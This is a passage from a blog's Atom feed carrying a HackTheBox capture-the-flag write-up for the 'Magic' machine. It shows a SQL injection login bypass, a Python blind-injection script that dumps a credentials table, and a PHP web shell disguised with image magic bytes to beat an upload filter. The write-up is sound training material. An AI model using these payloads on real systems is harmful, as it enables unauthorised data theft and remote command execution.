<?xml version="1.0" encoding="utf-8"?>


<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
    <title type="text">Alex Connat |Â Blog</title>
    <subtitle type="html">Personal Blog of Alex Connat</subtitle>
    <updated>2020-08-04T17:41:25&#43;02:00</updated>
    <id>https://alexconnat.github.io/</id>
    <link rel="alternate" type="text/html" href="https://alexconnat.github.io/" />
    <link rel="self" type="application/atom&#43;xml" href="https://alexconnat.github.io/atom.xml" />
    <author>
            <name>Alex Connat</name>
            <uri>https://alexconnat.github.io/</uri>
            </author>
    <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights>
    <generator uri="https://gohugo.io/" version="0.71.0">Hugo</generator>
        <entry>
            <title type="text">HTB Write-Up - Magic</title>
            <link rel="alternate" type="text/html" href="https://alexconnat.github.io/posts/write-up-magic/" />
            <id>https://alexconnat.github.io/posts/write-up-magic/</id>
            <updated>2020-05-26T23:00:50&#43;02:00</updated>
            <published>2020-05-20T18:00:00&#43;02:00</published>
            <author>
                    <name>Alex Connat</name>
                    <uri>https://alexconnat.github.io/</uri>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights><summary type="html">Magic is a Linux machine rated medium on HackTheBox. After the bypass of a login portal via a SQL injection, the initial foothold is gained through a malicious file upload on the web application.</summary>
            
                <content type="html">&lt;p&gt;&lt;img src=&#34;/img/Write-Up-Magic/magic-badge.png&#34; alt=&#34;Magic-Badge&#34; style=&#34;zoom:50%;&#34; /&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Magic&lt;/strong&gt; is a Linux machine rated medium on HackTheBox. After the bypass of a login portal via a SQL injection, the initial foothold is gained through a malicious file upload on the web application. Once having a shell as &lt;code&gt;www-data&lt;/code&gt;, we can then dump the content of the MySQL database to get the password of another user &lt;code&gt;theseus&lt;/code&gt; on the box. Finally, we exploit a SUID binary with the group privileges of this user to gain &lt;code&gt;root&lt;/code&gt; access.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;foothold&#34;&gt;Foothold&lt;/h1&gt;
&lt;h3 id=&#34;port-scan&#34;&gt;Port Scan&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Port&lt;/th&gt;
&lt;th&gt;Service&lt;/th&gt;
&lt;th&gt;Version&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;22&lt;/td&gt;
&lt;td&gt;ssh&lt;/td&gt;
&lt;td&gt;OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;80&lt;/td&gt;
&lt;td&gt;http&lt;/td&gt;
&lt;td&gt;Apache httpd 2.4.29 ((Ubuntu))  -  http-title: Magic Portfolio&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;We start by browsing the website http://10.10.10.185, we land on a page with a gallery of images. At the bottom of the website, a link redirects us to a login portal.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/img/Write-Up-Magic/website-landpage.png&#34; alt=&#34;website-landpage&#34; style=&#34;zoom:50%;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Nothing in the HTML source of the page seems to indicate a potential CMS in use, and we did not find any hidden information as HTML comments either. So our best chance is to use &lt;code&gt;gobuster&lt;/code&gt; to discover some hidden directories.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;We add the &lt;code&gt;-x php&lt;/code&gt; flag after having tested that http://10.10.10.185/index.php returns successfuly returns the home page.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;gobuster&#34;&gt;Gobuster&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;kali@kali:~$ gobuster dir --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --url http://10.10.10.185 -x php

/index.php (Status: 200)
/images (Status: 301)
/login.php (Status: 200)
/assets (Status: 301)
/upload.php (Status: 302)
/logout.php (Status: 302)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The page &lt;code&gt;/upload.php&lt;/code&gt; seems interesting! Alas, it redirects us back to the login portal&amp;hellip;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/img/Write-Up-Magic/login-portal.png&#34; alt=&#34;login-portal&#34; style=&#34;zoom:50%;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;At this point, we are pretty confident there must be a way to bypass this portal (&lt;em&gt;&lt;u&gt;Hint&lt;/u&gt;: Bruteforce is never the way&amp;hellip;&lt;/em&gt;)&lt;/p&gt;
&lt;h3 id=&#34;sql-injection---authentication-bypass&#34;&gt;SQL injection - Authentication Bypass&lt;/h3&gt;
&lt;p&gt;Testing for the most basic SQL injection in the &amp;ldquo;Username&amp;rdquo; field directly worked:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;user&#39; OR 1=1 #&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Note that there must be a Javascript thingy trying to prevent us to enter the space character inside these textfields, however this is just a client-side check AND it is easily circumvented just by copy-pasting your payload inside the input field ;)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;So we can access the &lt;code&gt;/upload.php&lt;/code&gt; page without being authenticated as a valid user. But we can go even further than that&amp;hellip;&lt;/p&gt;
&lt;h3 id=&#34;sql-injection---dumping-the-database&#34;&gt;SQL injection - Dumping the database&lt;/h3&gt;
&lt;p&gt;Now that we know this form is vulnerable to SQL injections, we might be able to retrieve information from the underlying database.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Observe the behaviour when you enter &lt;code&gt;user&#39; OR 1=1 #&lt;/code&gt; (i.e something which is &lt;strong&gt;True&lt;/strong&gt;)&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;You get a &lt;code&gt;302&lt;/code&gt; redirect to &lt;code&gt;/upload.php&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Observe the behaviour when you enter &lt;code&gt;user&#39; OR 1=2 #&lt;/code&gt; (i.e something which is &lt;strong&gt;False&lt;/strong&gt;)&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;You get a normal HTTP status code &lt;code&gt;200 OK&lt;/code&gt; back to &lt;code&gt;/login.php&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;From these observations, we can design a very simple boolean blind SQL injection POC in python which will map the database and dump the content of its tables:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;ch&#34;&gt;#!/usr/bin/python3&lt;/span&gt;

&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;requests&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;string&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;URL&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://10.10.10.185/login.php&amp;#34;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;ALPHABET&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;printable&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# For some reasons, the &amp;#39;space&amp;#39; character is always considered as valid, so remove it from our alphabet&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;r&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;[*] Guessing database name...&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;guess&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;char_nb&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;20&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ALPHABET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;guess&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;end&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;sqli&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;alex&amp;#39; OR SUBSTRING(database(), {char_nb}, 1) = &amp;#39;{c}&amp;#39; #&amp;#34;&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;username&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sqli&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;whatever&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;req&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;URL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;allow_redirects&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;bp&#34;&gt;False&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

        &lt;span class=&#34;c1&#34;&gt;# If the query is True, it will result in a 302 redirection to /upload.php :)&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;req&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;status_code&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;302&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;guess&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;

    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;guess&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;char_nb&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;# if you&amp;#39;re here, it means you didn&amp;#39;t hit any valid characters (most probably the end of the guessed string, or less probably the current character is not part of your ALPHABET)&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;guess&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;[-] Did not find anything.&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;[+] Found: &amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;guess&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;INSERT IMAGE SCREENCAST HERE&amp;hellip;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;This above code tries to guess &lt;strong&gt;the name of the database&lt;/strong&gt;, character by character, but you can apply the same logic to retrieve &lt;strong&gt;any string&lt;/strong&gt;, character by character &amp;ndash;&amp;gt; Just replace the &lt;code&gt;database()&lt;/code&gt; in the above &lt;code&gt;sqli&lt;/code&gt; variable by a &lt;u&gt;string&lt;/u&gt; (Caution: Not an &lt;u&gt;array&lt;/u&gt;) you want to know.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;For instance, to enumerate / guess the name of the db user:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;n&#34;&gt;sqli&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;john&amp;#39; OR SUBSTRING(user(), {char_nb}, 1) = &amp;#39;{c}&amp;#39; #&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;To enumerate the names of tables from the database whose name was found above (&lt;code&gt;magic&lt;/code&gt;):&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;n&#34;&gt;sqli&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;paul&amp;#39; OR SUBSTRING((SELECT TABLE_NAME from information_schema.tables where TABLE_SCHEMA LIKE &amp;#39;magic%&amp;#39; LIMIT 1 OFFSET 0), {char_nb}, 1) = &amp;#39;{c}&amp;#39; #&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;NB: Change the OFFSET to enumerate the second, the third table of the db (Spoiler Alert: there is only one table, named &lt;code&gt;login&lt;/code&gt;)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;To enumerate the columns of the above found table &lt;code&gt;login&lt;/code&gt;:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;n&#34;&gt;sqli&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;alex&amp;#39; OR SUBSTRING((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = &amp;#39;login&amp;#39; LIMIT 1 OFFSET 0), {char_nb}, 1) = &amp;#39;{c}&amp;#39; #&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;Spoiler: Found 3 columns:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;OFFSET 0 : &lt;code&gt;id&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;OFFSET 1 : &lt;code&gt;username&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;OFFSET 2 : &lt;code&gt;password&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Finally, to enumerate the first username and password from the table &lt;code&gt;login&lt;/code&gt;:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;n&#34;&gt;sqli&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;alex&amp;#39; OR SUBSTRING((SELECT username FROM login LIMIT 1 OFFSET 0), {char_nb}, 1) = &amp;#39;{c}&amp;#39; #&amp;#34;&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;---&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;---&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;sqli&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;alex&amp;#39; OR SUBSTRING((SELECT password FROM login LIMIT 1 OFFSET 0), {char_nb}, 1) = &amp;#39;{c}&amp;#39; #&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;pre&gt;&lt;code&gt;[*] Guessing username of 1st user from table &#39;login&#39;...
[+] Found: admin

[*] Guessing password of 1st user from table &#39;login&#39;...
[+] Found: th3s3usw4sk1ng
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So now, even more conveniently, we can access the upload page in a legitimate fashion, using the above credentials!&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;NB: Trying to connect via SSH using this password and the above found db user &amp;ldquo;theseus&amp;rdquo; failed, because SSH password authentication was disabled (only pubkey authentication).&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;malicious-file-upload&#34;&gt;Malicious file upload&lt;/h3&gt;
&lt;p&gt;The image upload portal allow you to&amp;hellip; well.. upload images :-)&lt;/p&gt;
&lt;p&gt;Whenever we try to upload something that &lt;em&gt;is not recognized&lt;/em&gt; as either a JPG or PNG image, we are prompted with the alert box shown below:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/img/Write-Up-Magic/alert-message.png&#34; alt=&#34;alert-message&#34;&gt;&lt;/p&gt;
&lt;p&gt;But whenever we upload a &lt;em&gt;legitimate&lt;/em&gt; image (e.g &lt;code&gt;sweet-little-poney.jpg&lt;/code&gt;), it gets displayed on the website homepage and hence we can see the path at which was saved: &lt;code&gt;/images/uploads/sweet-little-poney.jpg&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The name of the box (Magic) hints us towards the direction of &amp;ldquo;&lt;a href=&#34;https://en.wikipedia.org/wiki/Magic_number_(programming)&#34;&gt;magic bytes&lt;/a&gt;&amp;quot;. If we start the file containing our PHP payload by these bytes (choose your camp, PNG or JPG)&amp;hellip;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;PNG:&lt;/strong&gt; &lt;code&gt;89 50 4E 47 0D 0A 1A 0A&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;JPG:&lt;/strong&gt; &lt;code&gt;FF D8 FF DB&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;hellip; you can trick the command &lt;code&gt;file&lt;/code&gt; (or more generally, commands used to detect the true filetype of files) into thinking our PHP payload is actually an image.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Alternatively, we could have embed a comment containing our payload in the metadata of a JPG image using the &lt;code&gt;exiftool&lt;/code&gt; command line utility.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;exiftool -Comment=&#39;&amp;lt;?php echo system($_REQUEST[&#39;cmd&#39;]); ?&amp;gt;&#39; my-image.jpg
&lt;/code&gt;&lt;/pre&gt;&lt;/blockquote&gt;
&lt;p&gt;But wait a minute? If we upload this &amp;ldquo;image&amp;rdquo; containing:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;\xFF\xD8\xFF\xDB
&amp;lt;?php echo system($_REQUEST[&#39;cmd&#39;]); ?&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;and then retrieve it, using curl, or your browser or whatever; the server will most probably &lt;strong&gt;render&lt;/strong&gt; it (or serve it as an image, with &lt;code&gt;Content-Type: image/xxx&lt;/code&gt;) and &lt;strong&gt;not execute it&lt;/strong&gt; as a PHP piece of code&amp;hellip;&lt;/p&gt;
